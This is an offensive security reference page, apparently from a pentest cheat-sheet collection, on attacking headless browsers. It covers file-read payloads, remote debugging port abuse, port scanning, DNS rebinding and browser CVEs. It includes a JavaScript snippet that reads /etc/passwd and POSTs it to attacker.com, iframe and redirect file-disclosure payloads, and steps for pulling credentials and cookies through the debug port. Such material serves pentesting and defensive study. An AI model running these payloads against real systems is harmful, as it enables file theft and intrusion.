# Headless Browser

> A headless browser is a web browser without a graphical user interface. It works just like a regular browser, such as Chrome or Firefox, by interpreting HTML, CSS, and JavaScript, but it does so in the background, without displaying any visuals.
> Headless browsers are primarily used for automated tasks, such as web scraping, testing, and running scripts. They are particularly useful in situations where a full-fledged browser is not needed, or where resources (like memory or CPU) are limited.

## Summary

* [Headless Commands](#headless-commands)
* [Local File Read](#local-file-read)
* [Remote Debugging Port](#remote-debugging-port)
* [Network](#network)
    * [Port Scanning](#port-scanning)
    * [DNS Rebinding](#dns-rebinding)
* [CVE](#cve)
* [References](#references)

## Headless Commands

Example of headless browsers commands:

* Google Chrome

    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* Mozilla Firefox

    ```ps1
    firefox --screenshot https://www.google.com
    ```

* Microsoft Edge

    ```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
    ```

## Local File Read

### Insecure Flags

If the target is launched with the `--allow-file-access` option

```ps1
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

Since the file access is allowed, an atacker can create and expose an HTML file which captures the content of the `/etc/passwd` file.

```js
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
    fetch("https://attacker.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

### PDF Rendering

Consider a scenario where a headless browser captures a copy of a webpage and exports it to PDF, while the attacker has control over the URL being processed.

Target: `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

* Javascript Redirect

    ```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
    ```

* Iframe

    ```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
    ```

## Remote Debugging Port

The Remote Debugging Port in a headless browser (like Headless Chrome or Chromium) is a TCP port that exposes the browser’s DevTools Protocol so external tools (or scripts) can connect and control the browser remotely. It usually listen on port **9222** but it can be changed with `--remote-debugging-port=`.

**Target**: `google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

**Tools**:

* [slyd0g/WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) - Interact with Chromium-based browsers' debug port to view open tabs, installed extensions, and cookies
* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - WCMN alternative using Python to fix the websocket connection with an empty `origin` Header.

> [!NOTE]  
> Since Chrome update from December 20, 2022, you must start the browser with the argument `--remote-allow-origins="*"` to connect to the websocket with WhiteChocolateMacademiaNut.

**Exploits**:

* Connect and interact with the browser: `chrome://inspect/#devices`, `opera://inspect/#devices`
* Kill the currently running browser and use the `--restore-last-session` to get access to the user's tabs
* Data stored in the settings (username, passwords, token): `chrome://settings`
* Port Scan: In a loop open `http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
* Leak UUID: Iframe: `http://127.0.0.1:<port>/json/version`

    ```json
    {
        "Browser": "Chrome/136.0.7103.113",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36",
        "V8-Version": "13.6.233.10",
        "WebKit-Version": "537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)",
        "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87"
    }
    ```

* Local File Read: [pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)
* Node inspector `--inspect` works like a `--remote-debugging-port`

    ```ps1
    node --inspect app.js # default port 9229
    node --inspect=4444 app.js # custom port 4444
    node --inspect=0.0.0.0:4444 app.js
    ```

Starting from Chrome 136, the switches `--remote-debugging-port` and `--remote-debugging-pipe` won't be respected if attempting to debug the default Chrome data directory. These switches must now be accompanied by the `--user-data-dir` switch to point to a non-standard directory.

The flag `--user-data-dir=/path/to/data_dir` is used to specify the user's data directory, where Chromium stores all of its application data such as cookies and history. If you start Chromium without specifying this flag, you’ll notice that none of your bookmarks, favorites, or history will be loaded into the browser.

## Network

### Port Scanning

Port Scanning: Timing attack

* Dynamically insert an `<img>` tag pointing to a hypothetical closed port. Measure time to onerror.
* Repeat at least 10 times → average time to get an error for a closed port
* Test random port 10 times and measure time to error
* If `time_to_error(random_port) > time_to_error(closed_port)*1.3` → port is opened

**Consideration**:

* Chrome blocks by default a list of "known ports"
* Chrome blocks access to local network addresses except localhost through 0.0.0.0

### DNS Rebinding

* [nccgroup/singularity](https://github.com/nccgroup/singularity) - A DNS rebinding attack framework.

1. Chrome will make 2 DNS requests: `A` and `AAAA` records
    * `AAAA` response with valid Internet IP
    * `A` response with internal IP
2. Chrome will connect in priority to the IPv6 (evil.net)
3. Close IPv6 listener just after first response
4. Open Iframe to evil.net
5. Chrome will attempt to connect to the IPv6 but as it will fail it will fallback to the IPv4
6. From top window, inject script into iframe to exfiltrate content

## CVE

Exploiting a headless browser using a known vulnerability (CVE) involves several steps, from vulnerability research to payload execution. Below is a structured breakdown of the process:

Identify the headless browser with the User-Agent, then choose an exploit targeting the browser's component: V8 engine, Blink renderer, Webkit, etc.

* Chrome CVE: [2024-9122 - WASM type confusion due to imported tag signature subtyping](https://issues.chromium.org/issues/365802567), [CVE-2025-5419 - Out of bounds read and write in V8](https://nvd.nist.gov/vuln/detail/CVE-2025-5419)
* Firefox : [CVE-2024-9680 - Use after free](https://nvd.nist.gov/vuln/detail/CVE-2024-9680)

The `--no-sandbox` option disables the sandbox feature of the renderer process.

```js
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```

## References

* [Browser based Port Scanning with JavaScript - Nikolai Tschacher - January 10, 2021](https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
* [Changes to remote debugging switches to improve security - Will Harris - March 17, 2025](https://developer.chrome.com/blog/remote-debugging-port)
* [Chrome DevTools Protocol - Documentation - July 3, 2017](https://chromedevtools.github.io/devtools-protocol/)
* [Cookies with Chromium’s Remote Debugger Port - Justin Bui - December 17, 2020](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
* [Debugging Cookie Dumping Failures with Chromium’s Remote Debugger - Justin Bui - July 16, 2023](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
* [Node inspector/CEF debug abuse - HackTricks - July 18, 2024](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)
* [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely - wunderwuzzi - April 28, 2020](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [Too Lazy to get XSS? Then use n-days to get RCE in the Admin bot - Jopraveen - March 2, 2025](https://jopraveen.github.io/web-hackthebot/)
* [Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari - Daniel Thatcher - December 6, 2023](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)
